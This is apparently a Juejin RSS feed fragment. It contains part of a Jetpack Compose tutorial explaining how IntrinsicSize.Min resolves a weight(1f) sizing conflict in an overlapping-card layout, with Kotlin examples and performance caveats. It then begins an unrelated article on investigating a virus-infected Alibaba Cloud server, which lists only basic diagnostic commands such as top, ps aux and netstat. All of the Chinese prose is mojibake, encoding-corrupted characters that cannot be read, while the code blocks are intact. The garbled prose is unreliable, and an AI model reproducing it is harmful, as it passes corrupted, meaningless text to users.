<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">OverlappingCardContent</span><span class="hljs-params">(overlapHeight: <span class="hljs-type">Dp</span>)</span></span> {
    Box(modifier = Modifier.fillMaxWidth()) {
        <span class="hljs-comment">// Layer 1: Background</span>
        Column(modifier = Modifier.fillMaxWidth()) {
            Spacer(modifier = Modifier.height(overlapHeight)) <span class="hljs-comment">// 56dp transparent</span>
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .weight(<span class="hljs-number">1f</span>)  <span class="hljs-comment">// Fill remaining space with soft background</span>
                    .background(color = Color.LightGray)
            )
        }

        <span class="hljs-comment">// Layer 2: Card</span>
        Card(modifier = Modifier.fillMaxWidth()) {
            <span class="hljs-comment">// Card content...</span>
        }
    }
}
</code></pre>
<p><strong>ä½†æ˜¯è¿™è¡Œä¸é€šï¼</strong> ğŸ˜©</p>
<p><code>weight(1f)</code>ä¿®é¥°ç¬¦å¯¼è‡´äº†é—®é¢˜ã€‚å¸ƒå±€è¦ä¹ˆæ„å¤–åœ°æŠ˜å ï¼Œè¦ä¹ˆæ„å¤–åœ°å±•å¼€ã€‚</p>
<h2 data-id="heading-2">äº†è§£æ ¹æœ¬åŸå› </h2>
<p>ä¸ºäº†ç†è§£ä¸ºä»€ä¹ˆä¼šå¤±è´¥ï¼Œæˆ‘ä»¬å…ˆå›é¡¾ä¸€ä¸‹ Compose å¸ƒå±€çš„å·¥ä½œåŸç†ã€‚</p>
<h3 data-id="heading-3">Compose å¸ƒå±€ï¼šå•éç³»ç»Ÿ</h3>
<p>ä¸ºäº†æé«˜æ€§èƒ½ï¼ŒCompose å¸ƒå±€é‡‡ç”¨<strong>å•æ¬¡éå†</strong>æ–¹å¼æµ‹é‡å¸ƒå±€ã€‚æ¯ä¸ªå¯ç»„åˆå…ƒç´ ï¼š</p>
<ol>
<li>
<p>ä»çˆ¶å…ƒç´ æ¥æ”¶çº¦æŸ</p>
</li>
<li>
<p>æµ‹é‡å…¶å­å…ƒç´ </p>
</li>
<li>
<p>ç¡®å®šè‡ªèº«å¤§å°</p>
</li>
<li>
<p>æ”¾ç½®å…¶å­å…ƒç´ </p>
</li>
</ol>
<p>é—®é¢˜åœ¨äºï¼šå½“åƒ <code>Box</code> è¿™æ ·çš„çˆ¶å…ƒç´ æµ‹é‡å…¶å­å…ƒç´ æ—¶ï¼Œæ¯ä¸ªå­å…ƒç´ éƒ½ä¸çŸ¥é“å…¶ä»–å­å…ƒç´ çš„å¤§å°ã€‚å®ƒä»¬æ˜¯ç‹¬ç«‹æµ‹é‡çš„ã€‚</p>
<h2 data-id="heading-4">ä¸ºä»€ä¹ˆ <code>weight(1f)</code> ä¼šå¤±è´¥</h2>
<p><code>weight()</code> ä¿®é¥°ç¬¦è¡¨ç¤ºï¼šâ€œå æ®å‰©ä½™ç©ºé—´çš„ X å€ã€‚â€</p>
<p>ä½†æ˜¯å‰©ä½™ç©ºé—´æŒ‡çš„æ˜¯<strong>ä»€ä¹ˆ</strong>ï¼Ÿ<code>Box</code> å…ƒç´ å°šæœªç¡®å®šè‡ªèº«é«˜åº¦â€”â€”å®ƒæ­£åœ¨ç­‰å¾…å­å…ƒç´ å‘ŠçŸ¥å…¶è‡ªèº«å¤§å°ã€‚è¿™ä¼šé€ æˆå¾ªç¯ä¾èµ–ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">Box: <span class="hljs-string">"Children, how tall are you?"</span>
  â”œâ”€ Column: <span class="hljs-string">"I need 56dp + whatever weight(1f) gives me"</span>
  â”‚

  <span class="hljs-string">"But weight depends on your height, Box!"</span>
  â””â”€ Card: <span class="hljs-string">"I need ~180dp for my content"</span>  Box: <span class="hljs-string">"I'm confused..."</span> ğŸ¤¯
</code></pre>
<h2 data-id="heading-5">å¼•å…¥ IntrinsicSizeï¼šæ‰“ç ´å¾ªç¯ä¾èµ–</h2>
<p><code>IntrinsicSize</code> æ˜¯ Compose åœ¨å®é™…æµ‹é‡ä¹‹å‰å‘å­å…ƒç´ è¯¢é—®ä¸€ä¸ª<strong>å‡è®¾æ€§é—®é¢˜</strong> çš„æ–¹å¼ï¼š</p>
<blockquote>
<p><em><strong>â€œå¦‚æœæˆ‘ç»™ä½ æ— é™çš„ç©ºé—´ï¼Œä½ éœ€è¦çš„æœ€å°ï¼ˆæˆ–æœ€å¤§ï¼‰é«˜åº¦æ˜¯å¤šå°‘ï¼Ÿâ€</strong></em></p>
</blockquote>
<h2 data-id="heading-6">IntrinsicSize.Min ä¸ IntrinsicSize.Max</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4cf9ddbec314433fa358f44c9985ee53~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iA5pyJ54y_6K-J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770386256&amp;x-signature=NRXoBBMLT2ROOiCqJsAPmtmyxoo%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">ä¿®å¤</h2>
<pre><code class="hljs language-kotlin" lang="kotlin">Box(
    modifier = Modifier
        .fillMaxWidth()
        .height(IntrinsicSize.Min)  <span class="hljs-comment">// â† The magic line!</span>
) {
    <span class="hljs-comment">// Layer 1: Background</span>
    Column(modifier = Modifier.fillMaxWidth()) {
        Spacer(modifier = Modifier.height(<span class="hljs-number">56.</span>dp))
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .weight(<span class="hljs-number">1f</span>)
                .background(color = Color.LightGray)
        )
    }

    <span class="hljs-comment">// Layer 2: Card</span>
    Card(modifier = Modifier.fillMaxWidth()) {
        <span class="hljs-comment">// Card content...</span>
    }
}
</code></pre>
<p>ç°åœ¨å¸ƒå±€æ­£å¸¸äº†ï¼åŸå› å¦‚ä¸‹ï¼š</p>
<h2 data-id="heading-8">IntrinsicSize.Min å¦‚ä½•è§£å†³å†²çª</h2>
<p>å½“ <code>Box</code> ä½¿ç”¨ <code>height(IntrinsicSize.Min)</code> æ—¶ï¼Œå®ƒä¼šè¯¢é—®æ¯ä¸ªå­å…ƒç´ ï¼š</p>
<p><strong>åˆ—çš„æœ€å°å›ºæœ‰é«˜åº¦ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">Spacer: 56dp (fixed)
Weighted Box: 0dp (minimum, can shrink to nothing)
Total: 56dp
</code></pre>
<p><strong>å¡ç‰‡çš„æœ€å°å›ºæœ‰é«˜åº¦ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">Status row + Title + Subtitle + Button + Padding = ~180dp
Total: ~180dp
</code></pre>
<p><strong>Box é€‰æ‹©ï¼š</strong> <code>max(56dp, 180dp)</code> = <strong>180dp</strong></p>
<p>ä¸ºä»€ä¹ˆæ˜¯ <code>max()</code>ï¼Ÿå› ä¸º Box çš„é«˜åº¦éœ€è¦è¶³ä»¥å®¹çº³<strong>æ‰€æœ‰</strong>å­å…ƒç´ ï¼</p>
<p>ç°åœ¨å¸ƒå±€å®Œå…¨çŸ¥é“å¦‚ä½•é«˜åº¦è¦åˆé€‚ï¼Œ<code>weight(1f)</code> å¯ä»¥æ­£å¸¸å·¥ä½œï¼š</p>
<ul>
<li>
<p>ç›’å­é«˜åº¦ï¼š180dp</p>
</li>
<li>
<p>é—´è·ï¼š56dp</p>
</li>
<li>
<p>åŠ æƒèƒŒæ™¯ç›’å­ï¼š180dp â€” 56dp = <strong>124dp</strong></p>
</li>
</ul>
<h2 data-id="heading-9">å®Œæ•´è§£å†³æ–¹æ¡ˆï¼šé‡å å¡ç‰‡å¼ UI</h2>
<p>ä»¥ä¸‹æ˜¯æ”¯æŒæ­¤ UI çš„æœ€ç»ˆä»£ç ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> OVERLAP_HEIGHT = <span class="hljs-number">56.</span>dp
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">HeaderWithOverlappingCard</span><span class="hljs-params">(imageHeight: <span class="hljs-type">Dp</span>)</span></span> {
    LazyColumn {
        <span class="hljs-comment">// Create overlap: position content before header ends</span>
        item { 
            Spacer(modifier = Modifier.height(imageHeight - OVERLAP_HEIGHT)) 
        }

        item {
            OverlappingCardContent(overlapHeight = OVERLAP_HEIGHT)
        }
    }
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">OverlappingCardContent</span><span class="hljs-params">(overlapHeight: <span class="hljs-type">Dp</span>)</span></span> {
    Box(
        modifier = Modifier
            .fillMaxWidth()
            .height(IntrinsicSize.Min)
    ) {
        <span class="hljs-comment">// Layer 1: Background transition</span>
        Column(modifier = Modifier.fillMaxWidth()) {
            Spacer(modifier = Modifier.height(overlapHeight)) <span class="hljs-comment">// Transparent over header</span>
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .weight(<span class="hljs-number">1f</span>)
                    .background(color = SoftGrayBackground)
            )
        }

        <span class="hljs-comment">// Layer 2: Card content (drawn on top)</span>
        Card(
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = <span class="hljs-number">8.</span>dp),
            shape = RoundedCornerShape(<span class="hljs-number">12.</span>dp)
        ) {
            Column(modifier = Modifier.padding(<span class="hljs-number">24.</span>dp)) {
                Text(<span class="hljs-string">"âœ“ Success"</span>, color = Color.Green)
                Text(<span class="hljs-string">"â‚¹100 Cashback"</span>, style = MaterialTheme.typography.h4)
                Text(<span class="hljs-string">"Transaction complete"</span>)
                Spacer(modifier = Modifier.height(<span class="hljs-number">16.</span>dp))
                Button(onClick = {}) { Text(<span class="hljs-string">"View Details"</span>) }
            }
        }
    }
}
</code></pre>
<h2 data-id="heading-10">å¯è§†åŒ–åˆ†è§£</h2>
<pre><code class="hljs language-kotlin" lang="kotlin">imageHeight = 200dp
overlapHeight = 56dp
</code></pre>
<pre><code class="hljs language-bash" lang="bash">LazyColumn positions:
â”œâ”€ Spacer: 144dp (200 - 56)
â””â”€ OverlappingCardContent starts at Y = 144dp
</code></pre>
<pre><code class="hljs language-bash" lang="bash">Inside OverlappingCardContent (height = 180dp via IntrinsicSize.Min):
â”œâ”€ Column Layer:
â”‚   â”œâ”€ Spacer: 56dp (transparent, header shows through)
â”‚   â””â”€ Background Box: 124dp (soft gray)
â””â”€ Card Layer: 180dp (drawn from top, overlaps header)
</code></pre>
<h2 data-id="heading-11">IntrinsicSize çš„å¸¸è§ç”¨ä¾‹</h2>
<h3 data-id="heading-12">1. ä¸€è¡Œä¸­é«˜åº¦ç›¸åŒçš„æŒ‰é’®</h3>
<p><strong>é—®é¢˜ï¼š</strong> æ–‡æœ¬é•¿åº¦ä¸åŒçš„æŒ‰é’®æœ€ç»ˆé«˜åº¦ä¹Ÿä¸åŒã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">Row(modifier = Modifier.height(IntrinsicSize.Min)) {
    Button(
        modifier = Modifier.weight(<span class="hljs-number">1f</span>).fillMaxHeight(),
        onClick = {}
    ) { Text(<span class="hljs-string">"Short"</span>) }

    Button(
        modifier = Modifier.weight(<span class="hljs-number">1f</span>).fillMaxHeight(),
        onClick = {}
    ) { Text(<span class="hljs-string">"This is a much\nlonger button\nwith more text"</span>) }
}
</code></pre>
<p><strong>ç»“æœï¼š</strong> ä¸¤ä¸ªæŒ‰é’®çš„é«˜åº¦éƒ½ä¸æœ€é«˜çš„æŒ‰é’®é«˜åº¦ç›¸åŒã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd649e881a4e414c863752eac8df27e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iA5pyJ54y_6K-J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770386256&amp;x-signature=R5UuRucbFgrVNft6gRKQdW8BYRs%3D" alt="3.png" width="70%" loading="lazy"/></p>
<h3 data-id="heading-13">2. åˆ†éš”çº¿ä¸çˆ¶å…ƒç´ é«˜åº¦åŒ¹é…</h3>
<p><strong>é—®é¢˜ï¼š</strong> åˆ†éš”çº¿æ— æ³•æ‹‰ä¼¸ä»¥åŒ¹é…å¤šè¡Œå†…å®¹ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">Row(modifier = Modifier.height(IntrinsicSize.Min)) {
    Text(<span class="hljs-string">"Left content\nwith multiple\nlines"</span>)

    Divider(
        modifier = Modifier
            .fillMaxHeight()
            .width(<span class="hljs-number">1.</span>dp)
    )

    Text(<span class="hljs-string">"Right"</span>)
}
</code></pre>
<p><strong>ç»“æœï¼š</strong> åˆ†éš”çº¿å¯ä»¥æ‹‰ä¼¸ä»¥åŒ¹é…å¤šè¡Œæ–‡æœ¬çš„é«˜åº¦ã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a98827db35040439fa2d0659209ff1d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iA5pyJ54y_6K-J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770386256&amp;x-signature=6yWDTszRwQlJcKzyZbqg0LpAdXE%3D" alt="4.png" width="70%" loading="lazy"/></p>
<h3 data-id="heading-14">3. å¸¦æœ‰åŠ¨æ€å†…å®¹å’Œå›ºå®šè¦†ç›–å±‚çš„å¡ç‰‡</h3>
<p><strong>é—®é¢˜ï¼š</strong> è¦†ç›–å±‚éœ€è¦ä¸å¡ç‰‡å®½åº¦åŒ¹é…ï¼Œä½†å¡ç‰‡å®½åº¦æ˜¯åŠ¨æ€çš„ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">Box(modifier = Modifier.width(IntrinsicSize.Max)) {
    Card {
        Column {
            Text(<span class="hljs-string">"Dynamic content here..."</span>)
            <span class="hljs-comment">// More content</span>
        }
    }

    <span class="hljs-comment">// Badge that should match card width</span>
    Badge(
        modifier = Modifier
            .align(Alignment.TopEnd)
            .fillMaxWidth()
    )
}
</code></pre>
<h2 data-id="heading-15">æ€§èƒ½ç›¸å…³æ³¨æ„äº‹é¡¹ âš ï¸</h2>
<p><code>IntrinsicSize</code> ä¼šè§¦å‘<strong>ä¸¤éæµ‹é‡</strong>ï¼š</p>
<ol>
<li>
<p>ç¬¬ä¸€éï¼šæŸ¥è¯¢å›ºæœ‰å°ºå¯¸</p>
</li>
<li>
<p>ç¬¬äºŒéï¼šå®é™…æµ‹é‡å’Œå¸ƒå±€</p>
</li>
</ol>
<p>è¿™ä¼šå¸¦æ¥ä¸€å®šçš„æ€§èƒ½å¼€é”€ã€‚è°¨æ…ä½¿ç”¨ï¼š</p>
<h2 data-id="heading-16">âœ… é€‚ç”¨åœºæ™¯</h2>
<ul>
<li>
<p>å¤æ‚çš„åˆ†å±‚ UIï¼ˆä¾‹å¦‚æˆ‘ä»¬çš„é‡å å¡ç‰‡ï¼‰</p>
</li>
<li>
<p>ä½¿åŒçº§å…ƒç´ å¤§å°ä¸€è‡´</p>
</li>
<li>
<p>ä½¿åˆ†éš”ç¬¦/åˆ†éš”çº¿ä¸å†…å®¹åŒ¹é…</p>
</li>
<li>
<p>éœ€è¦å­å…ƒç´ åè°ƒå¤§å°æ—¶</p>
</li>
</ul>
<h2 data-id="heading-17">âŒ é¿å…ä½¿ç”¨åœºæ™¯</h2>
<ul>
<li>
<p>åœ¨å¯èƒ½ä¼šé‡å¤æ•°ç™¾æ¬¡çš„ <code>LazyColumn</code>/<code>LazyRow</code> å…ƒç´ ä¸­</p>
</li>
<li>
<p>æ·±åº¦åµŒå¥—çš„å›ºæœ‰å°ºå¯¸</p>
</li>
<li>
<p>å½“å›ºå®šå°ºå¯¸æˆ– <code>wrapContentHeight()</code> å¯ä»¥æ»¡è¶³éœ€æ±‚æ—¶</p>
</li>
<li>
<p>åœ¨æ€§èƒ½å…³é”®è·¯å¾„ä¸­</p>
</li>
</ul>
<h2 data-id="heading-18">è¦ç‚¹</h2>
<ol>
<li>
<p><code>**IntrinsicSize.Min**</code> = "ä½¿ç”¨å­å…ƒç´ æ‰€éœ€çš„æœ€å°é«˜åº¦"</p>
</li>
<li>
<p><code>**IntrinsicSize.Max**</code> = "ä½¿ç”¨å­å…ƒç´ å¯èƒ½éœ€è¦çš„æœ€å¤§é«˜åº¦"</p>
</li>
<li>
<p>å®ƒè§£å†³äº†çˆ¶å…ƒç´ å’Œå­å…ƒç´ å°ºå¯¸ä¹‹é—´çš„å¾ªç¯ä¾èµ–å…³ç³»</p>
</li>
<li>
<p>å¯¹äºå­å…ƒç´ ä½¿ç”¨ <code>weight()</code> æˆ– <code>fillMaxHeight()</code> çš„åˆ†å±‚ UI è‡³å…³é‡è¦</p>
</li>
<li>
<p>ä¼šå¸¦æ¥æ€§èƒ½å¼€é”€â€”â€”è¯·è°¨æ…ä½¿ç”¨</p>
</li>
</ol>
<h2 data-id="heading-19">ç»“è®º</h2>
<p><code>IntrinsicSize</code> çœ‹ä¼¼æ˜¯ä¸€ä¸ªå°ä¼—çš„ APIï¼Œä½†å®ƒå¯¹äºåœ¨ Compose ä¸­æ„å»ºå¤æ‚çš„ UI è‡³å…³é‡è¦ã€‚æˆ‘ä»¬æ„å»ºçš„é‡å å¡ç‰‡æ¨¡å¼åªæ˜¯å…¶ä¸­ä¸€ä¸ªä¾‹å­â€”â€”å½“ä½ éœ€è¦åè°ƒåŒçº§å…ƒç´ çš„å¤§å°ï¼Œæˆ–è€…å½“åˆ†å±‚å¸ƒå±€éœ€è¦â€œç»Ÿä¸€â€å°ºå¯¸æ—¶ï¼Œä½ ä¼šå‘ç°å®ƒéå¸¸å®ç”¨ã€‚</p>
<p>ä¸‹æ¬¡å½“ä½ çš„ Compose å¸ƒå±€åœ¨ä½¿ç”¨ <code>weight()</code> æˆ– <code>fillMaxHeight()</code> æ—¶å‡ºç°å¼‚å¸¸è¡Œä¸ºæ—¶ï¼Œè¯·è®°ä½ï¼š<strong>IntrinsicSize æˆ–è®¸èƒ½å¸®ä½ è§£å†³é—®é¢˜</strong>ã€‚</p>
<p><em>å¦‚æœä½ æœ‰ä»»ä½•ç–‘é—®æˆ–å‘ç°äº† IntrinsicSize çš„å…¶ä»–åˆ›æ„ç”¨æ³•ï¼Œè¯·åœ¨ä¸‹æ–¹ç•™è¨€ï¼</em></p>
<p><strong>å…³æ³¨æˆ‘ï¼Œè·å–æ›´å¤š Android å¼€å‘æŠ€å·§ã€‚</strong></p>
<blockquote>
<p>æ¬¢è¿æœç´¢å¹¶å…³æ³¨ <em>å…¬ä¼—å·<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fqrcode%3Fscene%3D10000004%26size%3D512%26__biz%3DMzU1MDg0NDczNA%3D%3D%26mid%3D2247484417%26idx%3D1%26sn%3D60c15f0d3c4be75e37748c2472a74102" target="_blank" title="https://mp.weixin.qq.com/mp/qrcode?scene=10000004&amp;size=512&amp;__biz=MzU1MDg0NDczNA==&amp;mid=2247484417&amp;idx=1&amp;sn=60c15f0d3c4be75e37748c2472a74102" ref="nofollow noopener noreferrer">ã€Œç¨€æœ‰çŒ¿è¯‰ã€</a></em> è·å–æ›´å¤šçš„ä¼˜è´¨æ–‡ç« ï¼</p>
<p>ä¿æŠ¤åŸåˆ›ï¼Œè¯·å‹¿è½¬è½½ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é˜¿é‡Œäº‘æœåŠ¡å™¨ä¸€ç›´è¢«ç—…æ¯’æ”»å‡»ï¼Œè¯¥å¦‚ä½•æ’æŸ¥å‘¢ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7600990891207016475</link>    <guid>https://juejin.cn/post/7600990891207016475</guid>    <pubDate>2026-01-30T12:12:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600990891207016475" data-draft-id="7600752623069249546" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é˜¿é‡Œäº‘æœåŠ¡å™¨ä¸€ç›´è¢«ç—…æ¯’æ”»å‡»ï¼Œè¯¥å¦‚ä½•æ’æŸ¥å‘¢ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-30T12:12:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="90åæ™¨ä»”"/> <meta itemprop="url" content="https://juejin.cn/user/2717648476705773"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é˜¿é‡Œäº‘æœåŠ¡å™¨ä¸€ç›´è¢«ç—…æ¯’æ”»å‡»ï¼Œè¯¥å¦‚ä½•æ’æŸ¥å‘¢ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648476705773/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    90åæ™¨ä»”
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T12:12:39.000Z" title="Fri Jan 30 2026 12:12:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä¸€ã€<strong>ç«‹å³åº”æ€¥å“åº”</strong></h3>
<ol>
<li>
<p><strong>æ–­å¼€ç½‘ç»œï¼ˆå¦‚æƒ…å†µä¸¥é‡ï¼‰</strong><br/>
å¦‚æœæ”»å‡»æ­£åœ¨é€ æˆä¸¥é‡å±å®³ï¼ˆå¦‚å¤§é‡å¤–å‘æµé‡ã€æŒ–çŸ¿ã€å‹’ç´¢ç­‰ï¼‰ï¼Œå¯ä¸´æ—¶åœ¨é˜¿é‡Œäº‘æ§åˆ¶å°å°†å®ä¾‹<strong>å®‰å…¨ç»„è§„åˆ™è®¾ä¸ºæ‹’ç»æ‰€æœ‰å…¥ç«™/å‡ºç«™</strong>ï¼Œæˆ–ç›´æ¥<strong>åœæ­¢å®ä¾‹</strong>ï¼Œé˜²æ­¢è¿›ä¸€æ­¥æ‰©æ•£ã€‚</p>
</li>
<li>
<p><strong>ä¸è¦ç›´æ¥åˆ é™¤å¯ç–‘æ–‡ä»¶</strong><br/>
å…ˆä¿ç•™è¯æ®ï¼Œç”¨äºåç»­åˆ†æã€‚å¯ä»¥å°†å¯ç–‘è¿›ç¨‹ã€æ–‡ä»¶ã€æ—¥å¿—å¤‡ä»½åˆ°å…¶ä»–å®‰å…¨ä½ç½®ã€‚</p>
</li>
<li>
<p><strong>æ£€æŸ¥å½“å‰è¿è¡Œçš„è¿›ç¨‹ä¸ç½‘ç»œè¿æ¥</strong><br/>
ç™»å½•æœåŠ¡å™¨åæ‰§è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">top                    <span class="hljs-comment"># æŸ¥çœ‹é«˜CPUå ç”¨è¿›ç¨‹</span>
ps aux                 <span class="hljs-comment"># åˆ—å‡ºæ‰€æœ‰è¿›ç¨‹</span>
netstat -tulnp         <span class="hljs-comment"># æŸ¥çœ‹ç›‘å¬ç«¯å£åŠå¯¹åº”è¿›ç¨‹</span>
ss -tulnp              <span class="hljs-comment"># æ›´ç°ä»£çš„æ›¿ä»£å‘½ä»¤</span>
